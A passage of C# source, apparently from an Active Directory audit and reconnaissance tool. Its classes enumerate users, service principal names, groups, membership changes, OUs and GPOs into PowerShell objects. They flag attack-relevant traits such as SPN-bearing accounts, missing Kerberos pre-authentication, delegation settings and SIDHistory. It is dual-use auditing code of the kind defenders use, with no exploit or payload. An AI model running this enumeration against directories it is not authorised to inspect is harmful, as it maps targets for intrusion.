                        //LastLogonDate = DateTime.FromFileTime((long)(AdUser.Members["lastLogonTimeStamp"].Value));
                        // LastLogonDate is lastLogonTimeStamp converted to local time
                        LastLogonDate = Convert.ToDateTime(AdUser.Members["LastLogonDate"].Value);
                        DaysSinceLastLogon = Math.Abs((Date1 - (DateTime)LastLogonDate).Days);
                        if (DaysSinceLastLogon > DormantTimeSpan)
                        {
                            Dormant = true;
                        }
                    }
                    else
                    {
                        NeverLoggedIn = true;
                    }
                    if (Convert.ToString(AdUser.Members["pwdLastSet"].Value) == "0")
                    {
                        if ((bool) AdUser.Members["PasswordNeverExpires"].Value == false)
                        {
                            MustChangePasswordatLogon = true;
                        }
                    }
                    if (AdUser.Members["PasswordLastSet"].Value != null)
                    {
                        //PasswordLastSet = DateTime.FromFileTime((long)(AdUser.Members["pwdLastSet"].Value));
                        // PasswordLastSet is pwdLastSet converted to local time
                        PasswordLastSet = Convert.ToDateTime(AdUser.Members["PasswordLastSet"].Value);
                        DaysSinceLastPasswordChange = Math.Abs((Date1 - (DateTime)PasswordLastSet).Days);
                        if (DaysSinceLastPasswordChange > PassMaxAge)
                        {
                            PasswordNotChangedafterMaxAge = true;
                        }
                    }
                    //https://msdn.microsoft.com/en-us/library/ms675098(v=vs.85).aspx
                    //if ((Int64) AdUser.Members["accountExpires"].Value != (Int64) 9223372036854775807)
                    //{
                        //if ((Int64) AdUser.Members["accountExpires"].Value != (Int64) 0)
                        if (AdUser.Members["AccountExpirationDate"].Value != null)
                        {
                            try
                            {
                                //AccountExpires = DateTime.FromFileTime((long)(AdUser.Members["accountExpires"].Value));
                                // AccountExpirationDate is accountExpires converted to local time
                                AccountExpires = Convert.ToDateTime(AdUser.Members["AccountExpirationDate"].Value);
                                AccountExpirationNumofDays = ((int)((DateTime)AccountExpires - Date1).Days);

                            }
                            catch //(Exception e)
                            {
                                //Console.WriteLine("Exception caught: {0}", e);
                            }
                        }
                    //}
                    Microsoft.ActiveDirectory.Management.ADPropertyValueCollection history = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) AdUser.Members["SIDHistory"].Value;
                    string sids = "";
                    foreach (var value in history)
                    {
                        sids = sids + "," + Convert.ToString(value);
                    }
                    SIDHistory = sids.TrimStart(',');
                    if (AdUser.Members["msDS-SupportedEncryptionTypes"].Value != null)
                    {
                        var userKerbEncFlags = (KerbEncFlags) AdUser.Members["msDS-SupportedEncryptionTypes"].Value;
                        if (userKerbEncFlags != KerbEncFlags.ZERO)
                        {
                            KerberosRC4 = (userKerbEncFlags & KerbEncFlags.RC4_HMAC) == KerbEncFlags.RC4_HMAC;
                            KerberosAES128 = (userKerbEncFlags & KerbEncFlags.AES128_CTS_HMAC_SHA1_96) == KerbEncFlags.AES128_CTS_HMAC_SHA1_96;
                            KerberosAES256 = (userKerbEncFlags & KerbEncFlags.AES256_CTS_HMAC_SHA1_96) == KerbEncFlags.AES256_CTS_HMAC_SHA1_96;
                        }
                    }
                    if (AdUser.Members["UserAccountControl"].Value != null)
                    {
                        AccountNotDelegated = !((bool) AdUser.Members["AccountNotDelegated"].Value);
                        if ((bool) AdUser.Members["TrustedForDelegation"].Value)
                        {
                            DelegationType = "Unconstrained";
                            DelegationServices = "Any";
                        }
                        if (AdUser.Members["msDS-AllowedToDelegateTo"] != null)
                        {
                            Microsoft.ActiveDirectory.Management.ADPropertyValueCollection delegateto = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) AdUser.Members["msDS-AllowedToDelegateTo"].Value;
                            if (delegateto.Value != null)
                            {
                                DelegationType = "Constrained";
                                foreach (var value in delegateto)
                                {
                                    DelegationServices = DelegationServices + "," + Convert.ToString(value);
                                }
                                DelegationServices = DelegationServices.TrimStart(',');
                            }
                        }
                        if ((bool) AdUser.Members["TrustedToAuthForDelegation"].Value == true)
                        {
                            DelegationProtocol = "Any";
                        }
                        else if (DelegationType != null)
                        {
                            DelegationProtocol = "Kerberos";
                        }
                    }

                    Microsoft.ActiveDirectory.Management.ADPropertyValueCollection SPNs = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection)AdUser.Members["servicePrincipalName"].Value;
                    if (SPNs.Value == null)
                    {
                        HasSPN = false;
                    }
                    else
                    {
                        HasSPN = true;
                    }

                    PSObject UserObj = new PSObject();
                    UserObj.Members.Add(new PSNoteProperty("UserName", CleanString(AdUser.Members["SamAccountName"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Name", CleanString(AdUser.Members["Name"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Enabled", Enabled));
                    UserObj.Members.Add(new PSNoteProperty("Must Change Password at Logon", MustChangePasswordatLogon));
                    UserObj.Members.Add(new PSNoteProperty("Cannot Change Password", AdUser.Members["CannotChangePassword"].Value));
                    UserObj.Members.Add(new PSNoteProperty("Password Never Expires", AdUser.Members["PasswordNeverExpires"].Value));
                    UserObj.Members.Add(new PSNoteProperty("Reversible Password Encryption", AdUser.Members["AllowReversiblePasswordEncryption"].Value));
                    UserObj.Members.Add(new PSNoteProperty("Smartcard Logon Required", AdUser.Members["SmartcardLogonRequired"].Value));
                    UserObj.Members.Add(new PSNoteProperty("Delegation Permitted", AccountNotDelegated));
                    UserObj.Members.Add(new PSNoteProperty("Kerberos DES Only", AdUser.Members["UseDESKeyOnly"].Value));
                    UserObj.Members.Add(new PSNoteProperty("Kerberos RC4", KerberosRC4));
                    UserObj.Members.Add(new PSNoteProperty("Kerberos AES-128bit", KerberosAES128));
                    UserObj.Members.Add(new PSNoteProperty("Kerberos AES-256bit", KerberosAES256));
                    UserObj.Members.Add(new PSNoteProperty("Does Not Require Pre Auth", AdUser.Members["DoesNotRequirePreAuth"].Value));
                    UserObj.Members.Add(new PSNoteProperty("Never Logged in", NeverLoggedIn));
                    UserObj.Members.Add(new PSNoteProperty("Logon Age (days)", DaysSinceLastLogon));
                    UserObj.Members.Add(new PSNoteProperty("Password Age (days)", DaysSinceLastPasswordChange));
                    UserObj.Members.Add(new PSNoteProperty("Dormant (> " + DormantTimeSpan + " days)", Dormant));
                    UserObj.Members.Add(new PSNoteProperty("Password Age (> " + PassMaxAge + " days)", PasswordNotChangedafterMaxAge));
                    UserObj.Members.Add(new PSNoteProperty("Account Locked Out", AdUser.Members["LockedOut"].Value));
                    UserObj.Members.Add(new PSNoteProperty("Password Expired", AdUser.Members["PasswordExpired"].Value));
                    UserObj.Members.Add(new PSNoteProperty("Password Not Required", AdUser.Members["PasswordNotRequired"].Value));
                    UserObj.Members.Add(new PSNoteProperty("Delegation Type", DelegationType));
                    UserObj.Members.Add(new PSNoteProperty("Delegation Protocol", DelegationProtocol));
                    UserObj.Members.Add(new PSNoteProperty("Delegation Services", DelegationServices));
                    UserObj.Members.Add(new PSNoteProperty("Logon Workstations", AdUser.Members["LogonWorkstations"].Value));
                    UserObj.Members.Add(new PSNoteProperty("AdminCount", AdUser.Members["AdminCount"].Value));
                    UserObj.Members.Add(new PSNoteProperty("Primary GroupID", AdUser.Members["primaryGroupID"].Value));
                    UserObj.Members.Add(new PSNoteProperty("SID", AdUser.Members["SID"].Value));
                    UserObj.Members.Add(new PSNoteProperty("SIDHistory", SIDHistory));
                    UserObj.Members.Add(new PSNoteProperty("HasSPN", HasSPN));
                    UserObj.Members.Add(new PSNoteProperty("Description", CleanString(AdUser.Members["Description"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Title", CleanString(AdUser.Members["Title"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Department", CleanString(AdUser.Members["Department"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Company", CleanString(AdUser.Members["Company"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Manager", CleanString(AdUser.Members["Manager"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Info", CleanString(AdUser.Members["Info"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Last Logon Date", LastLogonDate));
                    UserObj.Members.Add(new PSNoteProperty("Password LastSet", PasswordLastSet));
                    UserObj.Members.Add(new PSNoteProperty("Account Expiration Date", AccountExpires));
                    UserObj.Members.Add(new PSNoteProperty("Account Expiration (days)", AccountExpirationNumofDays));
                    UserObj.Members.Add(new PSNoteProperty("Mobile", CleanString(AdUser.Members["Mobile"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Email", CleanString(AdUser.Members["mail"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("HomeDirectory", AdUser.Members["homeDirectory"].Value));
                    UserObj.Members.Add(new PSNoteProperty("ProfilePath", AdUser.Members["profilePath"].Value));
                    UserObj.Members.Add(new PSNoteProperty("ScriptPath", AdUser.Members["ScriptPath"].Value));
                    UserObj.Members.Add(new PSNoteProperty("UserAccountControl", AdUser.Members["UserAccountControl"].Value));
                    UserObj.Members.Add(new PSNoteProperty("First Name", CleanString(AdUser.Members["givenName"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Middle Name", CleanString(AdUser.Members["middleName"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Last Name", CleanString(AdUser.Members["sn"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Country", CleanString(AdUser.Members["c"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("whenCreated", AdUser.Members["whenCreated"].Value));
                    UserObj.Members.Add(new PSNoteProperty("whenChanged", AdUser.Members["whenChanged"].Value));
                    UserObj.Members.Add(new PSNoteProperty("DistinguishedName", CleanString(AdUser.Members["DistinguishedName"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("CanonicalName", CleanString(AdUser.Members["CanonicalName"].Value)));
                    return new PSObject[] { UserObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class UserSPNRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdUser = (PSObject) record;
                    Microsoft.ActiveDirectory.Management.ADPropertyValueCollection SPNs = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection)AdUser.Members["servicePrincipalName"].Value;
                    if (SPNs.Value == null)
                    {
                        return new PSObject[] { };
                    }
                    List<PSObject> SPNList = new List<PSObject>();
                    bool? Enabled = null;
                    string Memberof = null;
                    DateTime? PasswordLastSet = null;

                    // When the user is not allowed to query the UserAccountControl attribute.
                    if (AdUser.Members["userAccountControl"].Value != null)
                    {
                        var userFlags = (UACFlags) AdUser.Members["userAccountControl"].Value;
                        Enabled = !((userFlags & UACFlags.ACCOUNTDISABLE) == UACFlags.ACCOUNTDISABLE);
                    }
                    if (Convert.ToString(AdUser.Members["pwdLastSet"].Value) != "0")
                    {
                        PasswordLastSet = DateTime.FromFileTime((long)AdUser.Members["pwdLastSet"].Value);
                    }
                    Microsoft.ActiveDirectory.Management.ADPropertyValueCollection MemberOfAttribute = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection)AdUser.Members["memberof"].Value;
                    if (MemberOfAttribute.Value != null)
                    {
                        foreach (string Member in MemberOfAttribute)
                        {
                            Memberof = Memberof + "," + ((Convert.ToString(Member)).Split(',')[0]).Split('=')[1];
                        }
                        Memberof = Memberof.TrimStart(',');
                    }
                    string Description = CleanString(AdUser.Members["Description"].Value);
                    string PrimaryGroupID = Convert.ToString(AdUser.Members["primaryGroupID"].Value);
                    foreach (string SPN in SPNs)
                    {
                        string[] SPNArray = SPN.Split('/');
                        PSObject UserSPNObj = new PSObject();
                        UserSPNObj.Members.Add(new PSNoteProperty("Username", CleanString(AdUser.Members["SamAccountName"].Value)));
                        UserSPNObj.Members.Add(new PSNoteProperty("Name", CleanString(AdUser.Members["Name"].Value)));
                        UserSPNObj.Members.Add(new PSNoteProperty("Enabled", Enabled));
                        UserSPNObj.Members.Add(new PSNoteProperty("Service", SPNArray[0]));
                        UserSPNObj.Members.Add(new PSNoteProperty("Host", SPNArray[1]));
                        UserSPNObj.Members.Add(new PSNoteProperty("Password Last Set", PasswordLastSet));
                        UserSPNObj.Members.Add(new PSNoteProperty("Description", Description));
                        UserSPNObj.Members.Add(new PSNoteProperty("Primary GroupID", PrimaryGroupID));
                        UserSPNObj.Members.Add(new PSNoteProperty("Memberof", Memberof));
                        SPNList.Add( UserSPNObj );
                    }
                    return SPNList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class GroupRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdGroup = (PSObject) record;
                    string ManagedByValue = Convert.ToString(AdGroup.Members["managedBy"].Value);
                    string ManagedBy = "";
                    string SIDHistory = "";

                    if (AdGroup.Members["managedBy"].Value != null)
                    {
                        ManagedBy = (ManagedByValue.Split(new string[] { "CN=" },StringSplitOptions.RemoveEmptyEntries))[0].Split(new string[] { "OU=" },StringSplitOptions.RemoveEmptyEntries)[0].TrimEnd(',');
                    }
                    Microsoft.ActiveDirectory.Management.ADPropertyValueCollection history = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) AdGroup.Members["SIDHistory"].Value;
                    string sids = "";
                    foreach (var value in history)
                    {
                        sids = sids + "," + Convert.ToString(value);
                    }
                    SIDHistory = sids.TrimStart(',');

                    PSObject GroupObj = new PSObject();
                    GroupObj.Members.Add(new PSNoteProperty("Name", AdGroup.Members["SamAccountName"].Value));
                    GroupObj.Members.Add(new PSNoteProperty("AdminCount", AdGroup.Members["AdminCount"].Value));
                    GroupObj.Members.Add(new PSNoteProperty("GroupCategory", AdGroup.Members["GroupCategory"].Value));
                    GroupObj.Members.Add(new PSNoteProperty("GroupScope", AdGroup.Members["GroupScope"].Value));
                    GroupObj.Members.Add(new PSNoteProperty("ManagedBy", ManagedBy));
                    GroupObj.Members.Add(new PSNoteProperty("SID", AdGroup.Members["sid"].Value));
                    GroupObj.Members.Add(new PSNoteProperty("SIDHistory", SIDHistory));
                    GroupObj.Members.Add(new PSNoteProperty("Description", CleanString(AdGroup.Members["Description"].Value)));
                    GroupObj.Members.Add(new PSNoteProperty("whenCreated", AdGroup.Members["whenCreated"].Value));
                    GroupObj.Members.Add(new PSNoteProperty("whenChanged", AdGroup.Members["whenChanged"].Value));
                    GroupObj.Members.Add(new PSNoteProperty("DistinguishedName", CleanString(AdGroup.Members["DistinguishedName"].Value)));
                    GroupObj.Members.Add(new PSNoteProperty("CanonicalName", AdGroup.Members["CanonicalName"].Value));
                    return new PSObject[] { GroupObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class GroupChangeRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdGroup = (PSObject) record;
                    string Action = null;
                    int? DaysSinceAdded = null;
                    int? DaysSinceRemoved = null;
                    DateTime? AddedDate = null;
                    DateTime? RemovedDate = null;
                    List<PSObject> GroupChangesList = new List<PSObject>();

                    Microsoft.ActiveDirectory.Management.ADPropertyValueCollection ReplValueMetaData = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) AdGroup.Members["msDS-ReplValueMetaData"].Value;

                    if (ReplValueMetaData.Value != null)
                    {
                        foreach (string ReplData in ReplValueMetaData)
                        {
                            XmlDocument ReplXML = new XmlDocument();
                            ReplXML.LoadXml(ReplData.Replace("\x00", "").Replace("&","&amp;"));

                            if (ReplXML.SelectSingleNode("DS_REPL_VALUE_META_DATA")["ftimeDeleted"].InnerText != "1601-01-01T00:00:00Z")
                            {
                                Action = "Removed";
                                AddedDate = DateTime.Parse(ReplXML.SelectSingleNode("DS_REPL_VALUE_META_DATA")["ftimeCreated"].InnerText);
                                DaysSinceAdded = Math.Abs((Date1 - (DateTime) AddedDate).Days);
                                RemovedDate = DateTime.Parse(ReplXML.SelectSingleNode("DS_REPL_VALUE_META_DATA")["ftimeDeleted"].InnerText);
                                DaysSinceRemoved = Math.Abs((Date1 - (DateTime) RemovedDate).Days);
                            }
                            else
                            {
                                Action = "Added";
                                AddedDate = DateTime.Parse(ReplXML.SelectSingleNode("DS_REPL_VALUE_META_DATA")["ftimeCreated"].InnerText);
                                DaysSinceAdded = Math.Abs((Date1 - (DateTime) AddedDate).Days);
                                RemovedDate = null;
                                DaysSinceRemoved = null;
                            }

                            PSObject GroupChangeObj = new PSObject();
                            GroupChangeObj.Members.Add(new PSNoteProperty("Group Name", AdGroup.Members["SamAccountName"].Value));
                            GroupChangeObj.Members.Add(new PSNoteProperty("Group DistinguishedName", CleanString(AdGroup.Members["DistinguishedName"].Value)));
                            GroupChangeObj.Members.Add(new PSNoteProperty("Member DistinguishedName", CleanString(ReplXML.SelectSingleNode("DS_REPL_VALUE_META_DATA")["pszObjectDn"].InnerText)));
                            GroupChangeObj.Members.Add(new PSNoteProperty("Action", Action));
                            GroupChangeObj.Members.Add(new PSNoteProperty("Added Age (Days)", DaysSinceAdded));
                            GroupChangeObj.Members.Add(new PSNoteProperty("Removed Age (Days)", DaysSinceRemoved));
                            GroupChangeObj.Members.Add(new PSNoteProperty("Added Date", AddedDate));
                            GroupChangeObj.Members.Add(new PSNoteProperty("Removed Date", RemovedDate));
                            GroupChangeObj.Members.Add(new PSNoteProperty("ftimeCreated", ReplXML.SelectSingleNode("DS_REPL_VALUE_META_DATA")["ftimeCreated"].InnerText));
                            GroupChangeObj.Members.Add(new PSNoteProperty("ftimeDeleted", ReplXML.SelectSingleNode("DS_REPL_VALUE_META_DATA")["ftimeDeleted"].InnerText));
                            GroupChangesList.Add( GroupChangeObj );
                        }
                    }
                    return GroupChangesList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class GroupRecordDictionaryProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdGroup = (PSObject) record;
                    ADWSClass.AdGroupDictionary.Add((Convert.ToString(AdGroup.Properties["SID"].Value)), (Convert.ToString(AdGroup.Members["SamAccountName"].Value)));
                    return new PSObject[] { };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class GroupMemberRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    // based on https://github.com/BloodHoundAD/BloodHound/blob/master/PowerShell/BloodHound.ps1
                    PSObject AdGroup = (PSObject) record;
                    List<PSObject> GroupsList = new List<PSObject>();
                    string SamAccountType = Convert.ToString(AdGroup.Members["samaccounttype"].Value);
                    string ObjectClass = Convert.ToString(AdGroup.Members["ObjectClass"].Value);
                    string AccountType = "";
                    string GroupName = "";
                    string MemberUserName = "-";
                    string MemberName = "";
                    string PrimaryGroupID = "";
                    PSObject GroupMemberObj = new PSObject();

                    if (ObjectClass == "foreignSecurityPrincipal")
                    {
                        AccountType = "foreignSecurityPrincipal";
                        MemberUserName = ((Convert.ToString(AdGroup.Members["DistinguishedName"].Value)).Split(',')[0]).Split('=')[1];
                        MemberName = null;
                        Microsoft.ActiveDirectory.Management.ADPropertyValueCollection MemberGroups = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection)AdGroup.Members["memberof"].Value;
                        if (MemberGroups.Value != null)
                        {
                            foreach (string GroupMember in MemberGroups)
                            {
                                GroupName = ((Convert.ToString(GroupMember)).Split(',')[0]).Split('=')[1];
                                GroupMemberObj = new PSObject();
                                GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                                GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                                GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                                GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                                GroupsList.Add( GroupMemberObj );
                            }
                        }
                    }
                    if (Groups.Contains(SamAccountType))
                    {
                        AccountType = "group";
                        MemberName = ((Convert.ToString(AdGroup.Members["DistinguishedName"].Value)).Split(',')[0]).Split('=')[1];
                        Microsoft.ActiveDirectory.Management.ADPropertyValueCollection MemberGroups = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection)AdGroup.Members["memberof"].Value;
                        if (MemberGroups.Value != null)
                        {
                            foreach (string GroupMember in MemberGroups)
                            {
                                GroupName = ((Convert.ToString(GroupMember)).Split(',')[0]).Split('=')[1];
                                GroupMemberObj = new PSObject();
                                GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                                GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                                GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                                GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                                GroupsList.Add( GroupMemberObj );
                            }
                        }
                    }
                    if (Users.Contains(SamAccountType))
                    {
                        AccountType = "user";
                        MemberName = ((Convert.ToString(AdGroup.Members["DistinguishedName"].Value)).Split(',')[0]).Split('=')[1];
                        MemberUserName = Convert.ToString(AdGroup.Members["sAMAccountName"].Value);
                        PrimaryGroupID = Convert.ToString(AdGroup.Members["primaryGroupID"].Value);
                        try
                        {
                            GroupName = ADWSClass.AdGroupDictionary[ADWSClass.DomainSID + "-" + PrimaryGroupID];
                        }
                        catch //(Exception e)
                        {
                            //Console.WriteLine("Exception caught: {0}", e);
                            GroupName = PrimaryGroupID;
                        }

                        GroupMemberObj = new PSObject();
                        GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                        GroupsList.Add( GroupMemberObj );

                        Microsoft.ActiveDirectory.Management.ADPropertyValueCollection MemberGroups = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection)AdGroup.Members["memberof"].Value;
                        if (MemberGroups.Value != null)
                        {
                            foreach (string GroupMember in MemberGroups)
                            {
                                GroupName = ((Convert.ToString(GroupMember)).Split(',')[0]).Split('=')[1];
                                GroupMemberObj = new PSObject();
                                GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                                GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                                GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                                GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                                GroupsList.Add( GroupMemberObj );
                            }
                        }
                    }
                    if (Computers.Contains(SamAccountType))
                    {
                        AccountType = "computer";
                        MemberName = ((Convert.ToString(AdGroup.Members["DistinguishedName"].Value)).Split(',')[0]).Split('=')[1];
                        MemberUserName = Convert.ToString(AdGroup.Members["sAMAccountName"].Value);
                        PrimaryGroupID = Convert.ToString(AdGroup.Members["primaryGroupID"].Value);
                        try
                        {
                            GroupName = ADWSClass.AdGroupDictionary[ADWSClass.DomainSID + "-" + PrimaryGroupID];
                        }
                        catch //(Exception e)
                        {
                            //Console.WriteLine("Exception caught: {0}", e);
                            GroupName = PrimaryGroupID;
                        }

                        GroupMemberObj = new PSObject();
                        GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                        GroupsList.Add( GroupMemberObj );

                        Microsoft.ActiveDirectory.Management.ADPropertyValueCollection MemberGroups = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection)AdGroup.Members["memberof"].Value;
                        if (MemberGroups.Value != null)
                        {
                            foreach (string GroupMember in MemberGroups)
                            {
                                GroupName = ((Convert.ToString(GroupMember)).Split(',')[0]).Split('=')[1];
                                GroupMemberObj = new PSObject();
                                GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                                GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                                GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                                GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                                GroupsList.Add( GroupMemberObj );
                            }
                        }
                    }
                    if (TrustAccounts.Contains(SamAccountType))
                    {
                        AccountType = "trust";
                        MemberName = ((Convert.ToString(AdGroup.Members["DistinguishedName"].Value)).Split(',')[0]).Split('=')[1];
                        MemberUserName = Convert.ToString(AdGroup.Members["sAMAccountName"].Value);
                        PrimaryGroupID = Convert.ToString(AdGroup.Members["primaryGroupID"].Value);
                        try
                        {
                            GroupName = ADWSClass.AdGroupDictionary[ADWSClass.DomainSID + "-" + PrimaryGroupID];
                        }
                        catch //(Exception e)
                        {
                            //Console.WriteLine("Exception caught: {0}", e);
                            GroupName = PrimaryGroupID;
                        }

                        GroupMemberObj = new PSObject();
                        GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                        GroupsList.Add( GroupMemberObj );
                    }
                    return GroupsList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class OURecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdOU = (PSObject) record;
                    PSObject OUObj = new PSObject();
                    OUObj.Members.Add(new PSNoteProperty("Name", AdOU.Members["Name"].Value));
                    OUObj.Members.Add(new PSNoteProperty("Depth", ((Convert.ToString(AdOU.Members["DistinguishedName"].Value).Split(new string[] { "OU=" }, StringSplitOptions.None)).Length -1)));
                    OUObj.Members.Add(new PSNoteProperty("Description", AdOU.Members["Description"].Value));
                    OUObj.Members.Add(new PSNoteProperty("whenCreated", AdOU.Members["whenCreated"].Value));
                    OUObj.Members.Add(new PSNoteProperty("whenChanged", AdOU.Members["whenChanged"].Value));
                    OUObj.Members.Add(new PSNoteProperty("DistinguishedName", AdOU.Members["DistinguishedName"].Value));
                    return new PSObject[] { OUObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class GPORecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdGPO = (PSObject) record;

                    PSObject GPOObj = new PSObject();
                    GPOObj.Members.Add(new PSNoteProperty("DisplayName", CleanString(AdGPO.Members["DisplayName"].Value)));
                    GPOObj.Members.Add(new PSNoteProperty("GUID", CleanString(AdGPO.Members["Name"].Value)));
                    GPOObj.Members.Add(new PSNoteProperty("whenCreated", AdGPO.Members["whenCreated"].Value));
                    GPOObj.Members.Add(new PSNoteProperty("whenChanged", AdGPO.Members["whenChanged"].Value));
                    GPOObj.Members.Add(new PSNoteProperty("DistinguishedName", CleanString(AdGPO.Members["DistinguishedName"].Value)));
                    GPOObj.Members.Add(new PSNoteProperty("FilePath", AdGPO.Members["gPCFileSysPath"].Value));
                    return new PSObject[] { GPOObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class GPORecordDictionaryProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdGPO = (PSObject) record;
                    ADWSClass.AdGPODictionary.Add((Convert.ToString(AdGPO.Members["DistinguishedName"].Value).ToUpper()), (Convert.ToString(AdGPO.Members["DisplayName"].Value)));
                    return new PSObject[] { };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class SOMRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdSOM = (PSObject) record;
                    List<PSObject> SOMsList = new List<PSObject>();
                    int Depth = 0;
                    bool BlockInheritance = false;
                    bool? LinkEnabled = null;
                    bool? Enforced = null;
                    string gPLink = Convert.ToString(AdSOM.Members["gPLink"].Value);
                    string GPOName = null;

                    Depth = (Convert.ToString(AdSOM.Members["DistinguishedName"].Value).Split(new string[] { "OU=" }, StringSplitOptions.None)).Length -1;
                    if (AdSOM.Members["gPOptions"].Value != null && (int) AdSOM.Members["gPOptions"].Value == 1)
                    {
                        BlockInheritance = true;
                    }
                    var GPLinks = gPLink.Split(']', '[').Where(x => x.StartsWith("LDAP"));
                    int Order = (GPLinks.ToArray()).Length;
                    if (Order == 0)
                    {
                        PSObject SOMObj = new PSObject();
                        SOMObj.Members.Add(new PSNoteProperty("Name", AdSOM.Members["Name"].Value));
                        SOMObj.Members.Add(new PSNoteProperty("Depth", Depth));
                        SOMObj.Members.Add(new PSNoteProperty("DistinguishedName", AdSOM.Members["DistinguishedName"].Value));
                        SOMObj.Members.Add(new PSNoteProperty("Link Order", null));
                        SOMObj.Members.Add(new PSNoteProperty("GPO", GPOName));
                        SOMObj.Members.Add(new PSNoteProperty("Enforced", Enforced));
                        SOMObj.Members.Add(new PSNoteProperty("Link Enabled", LinkEnabled));
                        SOMObj.Members.Add(new PSNoteProperty("BlockInheritance", BlockInheritance));
                        SOMObj.Members.Add(new PSNoteProperty("gPLink", gPLink));
                        SOMObj.Members.Add(new PSNoteProperty("gPOptions", AdSOM.Members["gPOptions"].Value));
                        SOMsList.Add( SOMObj );
                    }
                    foreach (string link in GPLinks)
                    {
                        string[] linksplit = link.Split('/', ';');
                        if (!Convert.ToBoolean((Convert.ToInt32(linksplit[3]) & 1)))
                        {
                            LinkEnabled = true;
                        }
                        else
                        {
                            LinkEnabled = false;
                        }
